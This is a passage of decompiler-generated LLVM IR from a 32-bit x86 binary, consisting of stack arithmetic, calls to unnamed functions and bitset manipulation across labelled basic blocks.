  %v1_8048a80 = inttoptr i32 %v0_8048a80 to i32*
  %v2_8048a80 = load i32, i32* %v1_8048a80, align 4
  store i32 %v2_8048a80, i32* %eax.global-to-local, align 4
  %v1_8048a81 = add i32 %v0_8048a80, 10388
  store i32 %v1_8048a81, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a81, i32* %v1_8048a80, align 4
  %v2_8048a89 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048a89, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a89, i32* @ebx, align 4
  %v0_8048a90 = load i32, i32* @esp, align 4
  %v1_8048a90 = inttoptr i32 %v0_8048a90 to i32*
  %v2_8048a90 = load i32, i32* %v1_8048a90, align 4
  store i32 %v2_8048a90, i32* %eax.global-to-local, align 4
  %v1_8048a91 = add i32 %v0_8048a90, 68
  %v2_8048a91 = inttoptr i32 %v1_8048a91 to i32*
  %v3_8048a91 = load i32, i32* %v2_8048a91, align 4
  store i32 %v3_8048a91, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a91, i32* %v1_8048a90, align 4
  %v2_8048a96 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048a96, i32* %eax.global-to-local, align 4
  %v0_8048a9b = load i32, i32* @esp, align 4
  %v1_8048a9e = add i32 %v0_8048a9b, 10388
  %v1_8048aa5 = load i32, i32* @ebx, align 4
  %v2_8048aa5 = add i32 %v1_8048a9e, %v1_8048aa5
  %v12_8048aa5 = icmp eq i32 %v2_8048aa5, 0
  store i1 %v12_8048aa5, i1* %zf.global-to-local, align 1
  store i32 %v2_8048aa5, i32* %edx.global-to-local, align 4
  %v2_8048aa7 = add i32 %v0_8048a9b, 8
  %v3_8048aa7 = inttoptr i32 %v2_8048aa7 to i32*
  store i32 %v2_8048aa5, i32* %v3_8048aa7, align 4
  %v1_8048aa8 = add i32 %v0_8048a9b, 4
  %v2_8048aa8 = inttoptr i32 %v1_8048aa8 to i32*
  store i32 10, i32* %v2_8048aa8, align 4
  %v3_8048aaa = inttoptr i32 %v0_8048a9b to i32*
  store i32 %v2_8048a96, i32* %v3_8048aaa, align 4
  %v4_8048aab = call i32 @function_8052060(i64 %v3_8048aab, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048aab, i32* %eax.global-to-local, align 4
  %v0_8048ab0 = load i32, i32* @esp, align 4
  %v1_8048ab0 = inttoptr i32 %v0_8048ab0 to i32*
  %v2_8048ab0 = load i32, i32* %v1_8048ab0, align 4
  store i32 %v2_8048ab0, i32* @ebx, align 4
  %v1_8048ab1 = add i32 %v0_8048ab0, 10388
  store i32 %v1_8048ab1, i32* %eax.global-to-local, align 4
  store i32 %v1_8048ab1, i32* %v1_8048ab0, align 4
  %v2_8048ab9 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048ab9, i32* %eax.global-to-local, align 4
  %v0_8048abe = load i32, i32* @esp, align 4
  %v1_8048abe = inttoptr i32 %v0_8048abe to i32*
  %v2_8048abe = load i32, i32* %v1_8048abe, align 4
  store i32 %v2_8048abe, i32* %edx.global-to-local, align 4
  %v3_8048abe = add i32 %v0_8048abe, 4
  %v1_8048abf = inttoptr i32 %v3_8048abe to i32*
  %v2_8048abf = load i32, i32* %v1_8048abf, align 4
  store i32 %v2_8048abf, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v1_8048abf, align 4
  %v1_8048ac5 = add i32 %v0_8048abe, 10388
  store i32 %v1_8048ac5, i32* %edx.global-to-local, align 4
  %v2_8048acc = add i32 %v1_8048ac5, %v2_8048ab9
  store i32 %v2_8048acc, i32* %eax.global-to-local, align 4
  store i32 %v2_8048acc, i32* %v1_8048abe, align 4
  %v3_8048ad0 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048ad0, i32* %eax.global-to-local, align 4
  %v0_8048ad5 = load i32, i32* @esp, align 4
  %v1_8048ad5 = add i32 %v0_8048ad5, 16
  %v6_8048ad5 = icmp eq i32 %v1_8048ad5, 0
  store i1 %v6_8048ad5, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048ad8

dec_label_pc_8048ad8:                             ; preds = %dec_label_pc_8048700, %dec_label_pc_80489c4
  %v0_8048ae3 = phi i32 [ %v1_80489b5, %dec_label_pc_8048700 ], [ %v1_8048ad5, %dec_label_pc_80489c4 ]
  %v0_8048ad8 = load i32, i32* @esi, align 4
  %v1_8048ad8 = add i32 %v0_8048ad8, 28
  %v2_8048ad8 = inttoptr i32 %v1_8048ad8 to i32*
  %v3_8048ad8 = load i32, i32* %v2_8048ad8, align 4
  store i32 %v3_8048ad8, i32* @ebx, align 4
  %v1_8048adb = icmp eq i32 %v3_8048ad8, 0
  store i1 %v1_8048adb, i1* %zf.global-to-local, align 1
  %tmp141 = icmp slt i32 %v3_8048ad8, 1
  br i1 %tmp141, label %dec_label_pc_8048bb4, label %dec_label_pc_8048ae3

dec_label_pc_8048ae3:                             ; preds = %dec_label_pc_8048ad8
  %v9_8048ae3 = icmp eq i32 %v0_8048ae3, 12
  store i1 %v9_8048ae3, i1* %zf.global-to-local, align 1
  %v1_8048ae6 = add i32 %v0_8048ae3, 10372
  store i32 %v1_8048ae6, i32* %ecx.global-to-local, align 4
  %v2_8048aed = add i32 %v0_8048ae3, -16
  %v3_8048aed = inttoptr i32 %v2_8048aed to i32*
  store i32 %v1_8048ae6, i32* %v3_8048aed, align 4
  %v2_8048aee = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048aee, i32* %eax.global-to-local, align 4
  %v0_8048af3 = load i32, i32* @esp, align 4
  %v1_8048af3 = inttoptr i32 %v0_8048af3 to i32*
  %v2_8048af3 = load i32, i32* %v1_8048af3, align 4
  store i32 %v2_8048af3, i32* %edx.global-to-local, align 4
  %v3_8048af3 = add i32 %v0_8048af3, 4
  %v1_8048af4 = inttoptr i32 %v3_8048af3 to i32*
  %v2_8048af4 = load i32, i32* %v1_8048af4, align 4
  store i32 %v2_8048af4, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8054b18.11 to i32), i32* %v1_8048af4, align 4
  %v1_8048afa = add i32 %v0_8048af3, 10388
  store i32 %v1_8048afa, i32* %edx.global-to-local, align 4
  %v2_8048b01 = add i32 %v1_8048afa, %v2_8048aee
  store i32 %v2_8048b01, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b01, i32* %v1_8048af3, align 4
  %v3_8048b05 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b05, i32* %eax.global-to-local, align 4
  %v0_8048b0a = load i32, i32* @esp, align 4
  %v1_8048b0a = add i32 %v0_8048b0a, 20916
  %v2_8048b0a = inttoptr i32 %v1_8048b0a to i32*
  store i32 0, i32* %v2_8048b0a, align 4
  %v0_8048b15 = load i32, i32* @esp, align 4
  %v1_8048b15 = add i32 %v0_8048b15, 16
  %v0_8048b18 = load i32, i32* @esi, align 4
  %v1_8048b18 = add i32 %v0_8048b18, 28
  %v2_8048b18 = inttoptr i32 %v1_8048b18 to i32*
  %v3_8048b18 = load i32, i32* %v2_8048b18, align 4
  store i32 %v3_8048b18, i32* %ebx.global-to-local, align 4
  %v1_8048b1b = icmp eq i32 %v3_8048b18, 0
  store i1 %v1_8048b1b, i1* %zf.global-to-local, align 1
  %tmp142 = icmp slt i32 %v3_8048b18, 1
  br i1 %tmp142, label %dec_label_pc_8048b8a, label %dec_label_pc_8048b1f

dec_label_pc_8048b1f:                             ; preds = %dec_label_pc_8048ae3
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8048b21

dec_label_pc_8048b21:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048b1f
  %v0_8048b24 = phi i32 [ %v1_8048b82, %dec_label_pc_8048b21 ], [ %v1_8048b15, %dec_label_pc_8048b1f ]
  %v0_8048b21 = phi i32 [ %v4_8048b85, %dec_label_pc_8048b21 ], [ 0, %dec_label_pc_8048b1f ]
  %v2_8048b21 = mul i32 %v0_8048b21, 128
  store i32 %v2_8048b21, i32* @ebx, align 4
  %v9_8048b24 = icmp eq i32 %v0_8048b24, 12
  store i1 %v9_8048b24, i1* %zf.global-to-local, align 1
  %v1_8048b27 = add i32 %v0_8048b24, 10372
  store i32 %v1_8048b27, i32* %ecx.global-to-local, align 4
  %v2_8048b2e = add i32 %v0_8048b24, -16
  %v3_8048b2e = inttoptr i32 %v2_8048b2e to i32*
  store i32 %v1_8048b27, i32* %v3_8048b2e, align 4
  %v2_8048b2f = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048b2f, i32* %eax.global-to-local, align 4
  %v0_8048b34 = load i32, i32* @esp, align 4
  %v1_8048b34 = inttoptr i32 %v0_8048b34 to i32*
  %v3_8048b34 = add i32 %v0_8048b34, 4
  %v0_8048b35 = load i32, i32* @ebx, align 4
  %v1_8048b35 = load i32, i32* @edi, align 4
  %v2_8048b35 = add i32 %v0_8048b35, 1472
  %v3_8048b35 = add i32 %v2_8048b35, %v1_8048b35
  store i32 %v3_8048b35, i32* %edx.global-to-local, align 4
  %v1_8048b3c = inttoptr i32 %v3_8048b34 to i32*
  %v2_8048b3c = load i32, i32* %v1_8048b3c, align 4
  store i32 %v2_8048b3c, i32* %ecx.global-to-local, align 4
  store i32 %v3_8048b35, i32* %v1_8048b3c, align 4
  %v1_8048b3e = add i32 %v0_8048b34, 10388
  store i32 %v1_8048b3e, i32* %edx.global-to-local, align 4
  %v2_8048b45 = add i32 %v1_8048b3e, %v2_8048b2f
  store i32 %v2_8048b45, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b45, i32* %v1_8048b34, align 4
  %v3_8048b49 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b49, i32* %eax.global-to-local, align 4
  %v0_8048b4e = load i32, i32* @esp, align 4
  %v1_8048b4e = inttoptr i32 %v0_8048b4e to i32*
  %v2_8048b4e = load i32, i32* %v1_8048b4e, align 4
  store i32 %v2_8048b4e, i32* @ebx, align 4
  %v1_8048b4f = add i32 %v0_8048b4e, 10388
  store i32 %v1_8048b4f, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048b4f, i32* %v1_8048b4e, align 4
  %v2_8048b57 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048b57, i32* %eax.global-to-local, align 4
  %v0_8048b5c = load i32, i32* @esp, align 4
  %v1_8048b5c = inttoptr i32 %v0_8048b5c to i32*
  %v2_8048b5c = load i32, i32* %v1_8048b5c, align 4
  store i32 %v2_8048b5c, i32* %edx.global-to-local, align 4
  %v3_8048b5c = add i32 %v0_8048b5c, 4
  %v1_8048b5d = inttoptr i32 %v3_8048b5c to i32*
  %v2_8048b5d = load i32, i32* %v1_8048b5d, align 4
  store i32 %v2_8048b5d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b21.12 to i32), i32* %v1_8048b5d, align 4
  %v1_8048b63 = add i32 %v0_8048b5c, 10388
  store i32 %v1_8048b63, i32* %edx.global-to-local, align 4
  %v2_8048b6a = add i32 %v1_8048b63, %v2_8048b57
  store i32 %v2_8048b6a, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b6a, i32* %v1_8048b5c, align 4
  %v3_8048b6e = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b6e, i32* %eax.global-to-local, align 4
  %v0_8048b73 = load i32, i32* @esp, align 4
  %v1_8048b73 = add i32 %v0_8048b73, 20916
  %v2_8048b73 = inttoptr i32 %v1_8048b73 to i32*
  %v3_8048b73 = load i32, i32* %v2_8048b73, align 4
  %v1_8048b7a = add i32 %v3_8048b73, 1
  store i32 %v1_8048b7a, i32* %ebx.global-to-local, align 4
  store i32 %v1_8048b7a, i32* %v2_8048b73, align 4
  %v0_8048b82 = load i32, i32* @esp, align 4
  %v1_8048b82 = add i32 %v0_8048b82, 16
  %v0_8048b85 = load i32, i32* @esi, align 4
  %v1_8048b85 = add i32 %v0_8048b85, 28
  %v2_8048b85 = inttoptr i32 %v1_8048b85 to i32*
  %v3_8048b85 = load i32, i32* %v2_8048b85, align 4
  %v4_8048b85 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8048b85 = sub i32 %v3_8048b85, %v4_8048b85
  %v11_8048b85 = xor i32 %v4_8048b85, %v3_8048b85
  %v12_8048b85 = xor i32 %v5_8048b85, %v3_8048b85
  %v13_8048b85 = and i32 %v12_8048b85, %v11_8048b85
  %v14_8048b85 = icmp slt i32 %v13_8048b85, 0
  %v15_8048b85 = icmp eq i32 %v5_8048b85, 0
  store i1 %v15_8048b85, i1* %zf.global-to-local, align 1
  %v16_8048b85 = icmp slt i32 %v5_8048b85, 0
  %v3_8048b88 = icmp eq i1 %v16_8048b85, %v14_8048b85
  %v4_8048b88 = icmp eq i1 %v15_8048b85, false
  %v5_8048b88 = and i1 %v4_8048b88, %v3_8048b88
  br i1 %v5_8048b88, label %dec_label_pc_8048b21, label %dec_label_pc_8048b8a

dec_label_pc_8048b8a:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048ae3
  %v0_8048b8a = phi i32 [ %v1_8048b15, %dec_label_pc_8048ae3 ], [ %v1_8048b82, %dec_label_pc_8048b21 ]
  %v9_8048b8a = icmp eq i32 %v0_8048b8a, 12
  store i1 %v9_8048b8a, i1* %zf.global-to-local, align 1
  %v1_8048b8d = add i32 %v0_8048b8a, 10372
  store i32 %v1_8048b8d, i32* %ecx.global-to-local, align 4
  %v2_8048b94 = add i32 %v0_8048b8a, -16
  %v3_8048b94 = inttoptr i32 %v2_8048b94 to i32*
  store i32 %v1_8048b8d, i32* %v3_8048b94, align 4
  %v2_8048b95 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048b95, i32* %eax.global-to-local, align 4
  %v0_8048b9a = load i32, i32* @esp, align 4
  %v1_8048b9a = inttoptr i32 %v0_8048b9a to i32*
  %v2_8048b9a = load i32, i32* %v1_8048b9a, align 4
  store i32 %v2_8048b9a, i32* @ebx, align 4
  %v3_8048b9a = add i32 %v0_8048b9a, 4
  %v1_8048b9b = inttoptr i32 %v3_8048b9a to i32*
  %v2_8048b9b = load i32, i32* %v1_8048b9b, align 4
  store i32 %v2_8048b9b, i32* %edi.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v1_8048b9b, align 4
  %v1_8048ba1 = add i32 %v0_8048b9a, 10388
  store i32 %v1_8048ba1, i32* %edx.global-to-local, align 4
  %v2_8048ba8 = add i32 %v1_8048ba1, %v2_8048b95
  store i32 %v2_8048ba8, i32* %eax.global-to-local, align 4
  store i32 %v2_8048ba8, i32* %v1_8048b9a, align 4
  %v3_8048bac = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bac, i32* %eax.global-to-local, align 4
  %v0_8048bb1 = load i32, i32* @esp, align 4
  %v1_8048bb1 = add i32 %v0_8048bb1, 16
  %v6_8048bb1 = icmp eq i32 %v1_8048bb1, 0
  store i1 %v6_8048bb1, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048bb4

dec_label_pc_8048bb4:                             ; preds = %dec_label_pc_8048ad8, %dec_label_pc_8048b8a
  %v0_8048bb4 = phi i32 [ %v0_8048ae3, %dec_label_pc_8048ad8 ], [ %v1_8048bb1, %dec_label_pc_8048b8a ]
  %v9_8048bb4 = icmp eq i32 %v0_8048bb4, 12
  store i1 %v9_8048bb4, i1* %zf.global-to-local, align 1
  %v1_8048bb7 = add i32 %v0_8048bb4, 10372
  store i32 %v1_8048bb7, i32* %ecx.global-to-local, align 4
  %v2_8048bbe = add i32 %v0_8048bb4, -16
  %v3_8048bbe = inttoptr i32 %v2_8048bbe to i32*
  store i32 %v1_8048bb7, i32* %v3_8048bbe, align 4
  %v2_8048bbf = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048bbf, i32* %eax.global-to-local, align 4
  %v0_8048bc4 = load i32, i32* @esp, align 4
  %v1_8048bc4 = inttoptr i32 %v0_8048bc4 to i32*
  %v2_8048bc4 = load i32, i32* %v1_8048bc4, align 4
  store i32 %v2_8048bc4, i32* %edx.global-to-local, align 4
  %v3_8048bc4 = add i32 %v0_8048bc4, 4
  %v1_8048bc5 = inttoptr i32 %v3_8048bc4 to i32*
  %v2_8048bc5 = load i32, i32* %v1_8048bc5, align 4
  store i32 %v2_8048bc5, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v1_8048bc5, align 4
  %v1_8048bcb = add i32 %v0_8048bc4, 10388
  store i32 %v1_8048bcb, i32* %edx.global-to-local, align 4
  %v2_8048bd2 = add i32 %v1_8048bcb, %v2_8048bbf
  store i32 %v2_8048bd2, i32* %eax.global-to-local, align 4
  store i32 %v2_8048bd2, i32* %v1_8048bc4, align 4
  %v3_8048bd6 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bd6, i32* %eax.global-to-local, align 4
  %v0_8048bdb = load i32, i32* @esp, align 4
  %v1_8048bdb = add i32 %v0_8048bdb, 16
  %v1_8048bde = add i32 %v0_8048bdb, 68
  %v2_8048bde = inttoptr i32 %v1_8048bde to i32*
  %v3_8048bde = load i32, i32* %v2_8048bde, align 4
  store i32 %v3_8048bde, i32* @edi, align 4
  %v1_8048be2 = icmp eq i32 %v3_8048bde, 0
  store i1 %v1_8048be2, i1* %zf.global-to-local, align 1
  br i1 %v1_8048be2, label %dec_label_pc_8048c10, label %dec_label_pc_8048be6

dec_label_pc_8048be6:                             ; preds = %dec_label_pc_8048bb4
  %v9_8048be6 = icmp eq i32 %v0_8048bdb, -4
  store i1 %v9_8048be6, i1* %zf.global-to-local, align 1
  %v1_8048be9 = add i32 %v0_8048bdb, 10388
  store i32 %v1_8048be9, i32* %ecx.global-to-local, align 4
  %v3_8048bf0 = inttoptr i32 %v0_8048bdb to i32*
  store i32 %v1_8048be9, i32* %v3_8048bf0, align 4
  %v2_8048bf1 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8048bf1, i32* %eax.global-to-local, align 4
  %v0_8048bf6 = load i32, i32* @esp, align 4
  %v1_8048bf6 = inttoptr i32 %v0_8048bf6 to i32*
  %v2_8048bf6 = load i32, i32* %v1_8048bf6, align 4
  store i32 %v2_8048bf6, i32* %ecx.global-to-local, align 4
  %v3_8048bf6 = add i32 %v0_8048bf6, 4
  %v1_8048bf7 = inttoptr i32 %v3_8048bf6 to i32*
  %v2_8048bf7 = load i32, i32* %v1_8048bf7, align 4
  store i32 %v2_8048bf7, i32* @ebx, align 4
  %v1_8048bf8 = add i32 %v0_8048bf6, 68
  %v2_8048bf8 = inttoptr i32 %v1_8048bf8 to i32*
  %v3_8048bf8 = load i32, i32* %v2_8048bf8, align 4
  store i32 %v3_8048bf8, i32* %v1_8048bf7, align 4
  %v1_8048bfd = add i32 %v0_8048bf6, 10388
  store i32 %v1_8048bfd, i32* %edx.global-to-local, align 4
  %v2_8048c04 = add i32 %v1_8048bfd, %v2_8048bf1
  store i32 %v2_8048c04, i32* %eax.global-to-local, align 4
  store i32 %v2_8048c04, i32* %v1_8048bf6, align 4
  %v3_8048c08 = call i32 @function_8051c70(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048c08, i32* %eax.global-to-local, align 4
  %v0_8048c0d = load i32, i32* @esp, align 4
  %v1_8048c0d = add i32 %v0_8048c0d, 16
  %v6_8048c0d = icmp eq i32 %v1_8048c0d, 0
  store i1 %v6_8048c0d, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c10

dec_label_pc_8048c10:                             ; preds = %dec_label_pc_8048bb4, %dec_label_pc_8048be6
  %v1_8048c10 = phi i32 [ %v1_8048bdb, %dec_label_pc_8048bb4 ], [ %v1_8048c0d, %dec_label_pc_8048be6 ]
  %v0_8048c10 = phi i32 [ %v3_8048bd6, %dec_label_pc_8048bb4 ], [ %v3_8048c08, %dec_label_pc_8048be6 ]
  %v2_8048c10 = add i32 %v1_8048c10, -4
  %v3_8048c10 = inttoptr i32 %v2_8048c10 to i32*
  store i32 %v0_8048c10, i32* %v3_8048c10, align 4
  %v0_8048c11 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048c11 = add i32 %v1_8048c10, -8
  %v3_8048c11 = inttoptr i32 %v2_8048c11 to i32*
  store i32 %v0_8048c11, i32* %v3_8048c11, align 4
  %v0_8048c12 = load i32, i32* @esi, align 4
  %v2_8048c12 = add i32 %v1_8048c10, -12
  %v3_8048c12 = inttoptr i32 %v2_8048c12 to i32*
  store i32 %v0_8048c12, i32* %v3_8048c12, align 4
  %v1_8048c13 = add i32 %v1_8048c10, 96
  %v2_8048c13 = inttoptr i32 %v1_8048c13 to i32*
  %v3_8048c13 = load i32, i32* %v2_8048c13, align 4
  store i32 %v3_8048c13, i32* %eax.global-to-local, align 4
  %v2_8048c17 = add i32 %v1_8048c10, -16
  %v3_8048c17 = inttoptr i32 %v2_8048c17 to i32*
  store i32 %v3_8048c13, i32* %v3_8048c17, align 4
  %v0_8048c18 = call i32 @function_8051fc0()
  store i32 %v0_8048c18, i32* %eax.global-to-local, align 4
  %v0_8048c1d = load i32, i32* @esp, align 4
  %v1_8048c1d = add i32 %v0_8048c1d, 16
  %v3_8048c20 = trunc i32 %v0_8048c18 to i8
  %v4_8048c20 = icmp eq i8 %v3_8048c20, 0
  store i1 %v4_8048c20, i1* %zf.global-to-local, align 1
  br i1 %v4_8048c20, label %dec_label_pc_804979e, label %dec_label_pc_8048c28

dec_label_pc_8048c28:                             ; preds = %dec_label_pc_8048c10, %dec_label_pc_804979e
  %v0_8048c28 = phi i32 [ %v1_8048c1d, %dec_label_pc_8048c10 ], [ %v1_80497ab, %dec_label_pc_804979e ]
  %v9_8048c28 = icmp eq i32 %v0_8048c28, 12
  store i1 %v9_8048c28, i1* %zf.global-to-local, align 1
  %v1_8048c2b = add i32 %v0_8048c28, 10372
  store i32 %v1_8048c2b, i32* %ecx.global-to-local, align 4
  %v2_8048c32 = add i32 %v0_8048c28, -16
  %v3_8048c32 = inttoptr i32 %v2_8048c32 to i32*
  store i32 %v1_8048c2b, i32* %v3_8048c32, align 4
  %v2_8048c33 = call i32 @function_8051c50(i8* %v1_8048752)
  %v0_8048c38 = load i32, i32* @esp, align 4
  %v1_8048c38 = add i32 %v0_8048c38, -4
  %v2_8048c38 = inttoptr i32 %v1_8048c38 to i32*
  store i32 16384, i32* %v2_8048c38, align 4
  %v2_8048c3d = add i32 %v0_8048c38, -8
  %v3_8048c3d = inttoptr i32 %v2_8048c3d to i32*
  store i32 %v2_8048c33, i32* %v3_8048c3d, align 4
  %v1_8048c3e = add i32 %v0_8048c38, 10388
  store i32 %v1_8048c3e, i32* %eax.global-to-local, align 4
  %v2_8048c45 = add i32 %v0_8048c38, -12
  %v3_8048c45 = inttoptr i32 %v2_8048c45 to i32*
  store i32 %v1_8048c3e, i32* %v3_8048c45, align 4
  %v0_8048c46 = load i32, i32* @esi, align 4
  %v1_8048c46 = add i32 %v0_8048c46, -1440
  %v2_8048c46 = inttoptr i32 %v1_8048c46 to i32*
  %v3_8048c46 = load i32, i32* %v2_8048c46, align 4
  store i32 %v3_8048c46, i32* %ecx.global-to-local, align 4
  %v2_8048c4c = add i32 %v0_8048c38, -16
  %v3_8048c4c = inttoptr i32 %v2_8048c4c to i32*
  store i32 %v3_8048c46, i32* %v3_8048c4c, align 4
  %v0_8048c4d = call i32 @function_8052934()
  store i32 %v0_8048c4d, i32* %eax.global-to-local, align 4
  %v0_8048c52 = load i32, i32* @esp, align 4
  %v1_8048c52 = add i32 %v0_8048c52, 112
  %v2_8048c52 = inttoptr i32 %v1_8048c52 to i32*
  %v3_8048c52 = load i32, i32* %v2_8048c52, align 4
  store i32 %v3_8048c52, i32* %edx.global-to-local, align 4
  %v0_8048c56 = load i32, i32* @esi, align 4
  %v1_8048c56 = add i32 %v0_8048c56, -1440
  %v2_8048c56 = inttoptr i32 %v1_8048c56 to i32*
  %v3_8048c56 = load i32, i32* %v2_8048c56, align 4
  store i32 %v3_8048c56, i32* %eax.global-to-local, align 4
  %v2_8048c5c = add i32 %v0_8048c56, -1428
  %v3_8048c5c = inttoptr i32 %v2_8048c5c to i32*
  store i32 %v3_8048c52, i32* %v3_8048c5c, align 4
  %v0_8048c62 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048c62, i32* %edx.global-to-local, align 4
  %v0_8048c64 = load i32, i32* @esi, align 4
  %v1_8048c64 = add i32 %v0_8048c64, -1436
  %v2_8048c64 = inttoptr i32 %v1_8048c64 to i8*
  store i8 6, i8* %v2_8048c64, align 1
  %v0_8048c6b = load i32, i32* %eax.global-to-local, align 4
  %v1_8048c6b = urem i32 %v0_8048c6b, 32
  store i32 %v1_8048c6b, i32* %eax.global-to-local, align 4
  %v0_8048c6e = load i32, i32* %edx.global-to-local, align 4
  %v2_8048c6e = udiv i32 %v0_8048c6e, 32
  store i32 %v2_8048c6e, i32* %edx.global-to-local, align 4
  %v0_8048c71 = load i32, i32* @esp, align 4
  %v2_8048c71 = mul nuw nsw i32 %v2_8048c6e, 4
  %v3_8048c71 = add nuw nsw i32 %v2_8048c71, 20772
  %v4_8048c71 = add i32 %v3_8048c71, %v0_8048c71
  %v5_8048c71 = inttoptr i32 %v4_8048c71 to i32*
  %v6_8048c71 = load i32, i32* %v5_8048c71, align 4
  %v9_8048c71 = shl i32 1, %v1_8048c6b
  %v12_8048c71 = or i32 %v6_8048c71, %v9_8048c71
  %v16_8048c71 = add i32 %v0_8048c71, 20772
  %v17_8048c71 = add i32 %v16_8048c71, %v2_8048c71
  %v18_8048c71 = inttoptr i32 %v17_8048c71 to i32*
  store i32 %v12_8048c71, i32* %v18_8048c71, align 4
  %v0_8048c79 = load i32, i32* @esp, align 4
  %v1_8048c79 = add i32 %v0_8048c79, 32
  %v0_8048c7c = load i32, i32* @esi, align 4
  %v1_8048c7c = add i32 %v0_8048c7c, -1440
  %v2_8048c7c = inttoptr i32 %v1_8048c7c to i32*
  %v3_8048c7c = load i32, i32* %v2_8048c7c, align 4
  store i32 %v3_8048c7c, i32* %eax.global-to-local, align 4
  %v1_8048c82 = add i32 %v0_8048c79, 104
  %v2_8048c82 = inttoptr i32 %v1_8048c82 to i32*
  %v3_8048c82 = load i32, i32* %v2_8048c82, align 4
  %v5_8048c82 = sub i32 %v3_8048c82, %v3_8048c7c
  %v11_8048c82 = xor i32 %v3_8048c82, %v3_8048c7c
  %v12_8048c82 = xor i32 %v5_8048c82, %v3_8048c82
  %v13_8048c82 = and i32 %v12_8048c82, %v11_8048c82
  %v14_8048c82 = icmp slt i32 %v13_8048c82, 0
  %v15_8048c82 = icmp eq i32 %v5_8048c82, 0
  store i1 %v15_8048c82, i1* %zf.global-to-local, align 1
  %v16_8048c82 = icmp slt i32 %v5_8048c82, 0
  %v2_8048c86 = icmp eq i1 %v16_8048c82, %v14_8048c82
  br i1 %v2_8048c86, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_80486ee
  store i8 0, i8* %v2_80485a5, align 1
  br label %dec_label_pc_80485be

dec_label_pc_8048c9d:                             ; preds = %dec_label_pc_8048537
  %v0_8048c9d = load i32, i32* @esp, align 4
  %v1_8048c9d = add i32 %v0_8048c9d, 80
  %v2_8048c9d = inttoptr i32 %v1_8048c9d to i32*
  %v3_8048c9d = load i32, i32* %v2_8048c9d, align 4
  store i32 %v3_8048c9d, i32* %eax.global-to-local, align 4
  %v1_8048ca1 = add i32 %v0_80485a5, -1432
  %v2_8048ca1 = inttoptr i32 %v1_8048ca1 to i32*
  %v3_8048ca1 = load i32, i32* %v2_8048ca1, align 4
  store i32 %v3_8048ca1, i32* @ebx, align 4
  %v2_8048ca7 = sub i32 %v3_8048c9d, %v3_8048ca1
  store i32 %v2_8048ca7, i32* %eax.global-to-local, align 4
  %v9_8048ca9 = icmp eq i32 %v2_8048ca7, 30
  store i1 %v9_8048ca9, i1* %zf.global-to-local, align 1
  %tmp241 = icmp ult i32 %v2_8048ca7, 31
  br i1 %tmp241, label %dec_label_pc_8048cb2, label %dec_label_pc_804855f

dec_label_pc_8048cb2:                             ; preds = %dec_label_pc_8048c9d
  %v1_8048cb2 = add i32 %v0_80485a5, -1440
  %v2_8048cb2 = inttoptr i32 %v1_8048cb2 to i32*
  %v3_8048cb2 = load i32, i32* %v2_8048cb2, align 4
  %v1_8048cba = urem i32 %v3_8048cb2, 32
  store i32 %v1_8048cba, i32* %eax.global-to-local, align 4
  %v2_8048cbd = udiv i32 %v3_8048cb2, 32
  store i32 %v2_8048cbd, i32* %edx.global-to-local, align 4
  %v2_8048cc0 = mul nuw nsw i32 %v2_8048cbd, 4
  %v3_8048cc0 = add i32 %v0_8048c9d, 20612
  %v4_8048cc0 = add i32 %v3_8048cc0, %v2_8048cc0
  %v5_8048cc0 = inttoptr i32 %v4_8048cc0 to i32*
  %v6_8048cc0 = load i32, i32* %v5_8048cc0, align 4
  %v9_8048cc0 = shl i32 1, %v1_8048cba
  %v12_8048cc0 = or i32 %v6_8048cc0, %v9_8048cc0
  store i32 %v12_8048cc0, i32* %v5_8048cc0, align 4
  %v0_8048cc8 = load i32, i32* @esi, align 4
